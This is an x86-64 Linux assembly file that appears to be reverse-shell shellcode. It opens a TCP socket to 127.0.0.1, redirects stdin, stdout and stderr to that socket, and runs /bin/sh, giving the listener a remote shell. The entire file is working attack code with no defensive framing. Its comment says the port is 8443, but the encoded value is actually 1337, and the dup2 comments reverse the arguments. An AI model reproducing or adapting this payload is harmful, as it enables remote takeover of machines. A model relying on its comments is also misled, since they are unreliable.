BITS 64
global _start

section .text
    _start:
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    

    ; int socket(int domain, int type, int protocol)
    ; int socket(%rdi,%rsi,%rdx)
    ; int socket(2,1,0)
    ; arguments pushed in reverse order
    xor rdx, rdx
    mov sil, 0x01
    mov dil, 0x02
    mov al, 0x29 ;sys_socket
    syscall

    ;sys_connect
    ;sys_connect(int fd,struct sockaddr *uservaddr, int addrlen)
    ;sys_connect(%rdi, %rsi, %rdx)
    ; struct sockaddr {
    ;       sa_family_t sa_family;
    ;       char        sa_data[14];
    ;       }

    mov dil,al
    xor r11, r11
    push 0x0100007f ;127.0.0.1
    push word 0x3905        ; port = 8443
    push word 0x2
    mov  rsi, rsp
    mov  dl, 0x10
    mov al, 0x2a ;sys_connect
    syscall

    ;sys_dup2 (stdin, stdout, stderr)
    ;sys_dup2 (unsigned int oldfd, unsigned int newfd)
    ;sys_dup2 (%rdi, %rsi)
    xor r11, r11
    mov dil, 0x03
    mov rsi, r11
    mov al, 0x21; sys_dup2
    syscall ;sys_dup2(0,3)

    xor r11, r11
    mov dil, 0x03
    mov sil, 0x01
    mov al, 0x21
    syscall; sys_dup2(1,3)

    xor r11, r11
    mov dil, 0x03
    mov sil, 0x02
    mov al, 0x21
    syscall; sys_dup2(2,3)



    ; execve("//bin/sh")
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor r13, r13
    mov al, 59         ;rax=numero du syscall
    mov rdi, "/bin/sh" ;
    push r13
    push rdi
    mov rdi, rsp
    push r13
    push rdi
    mov rsi, rsp
    xor rdx, rdx
    syscall             ;execenv(rdi,rsi)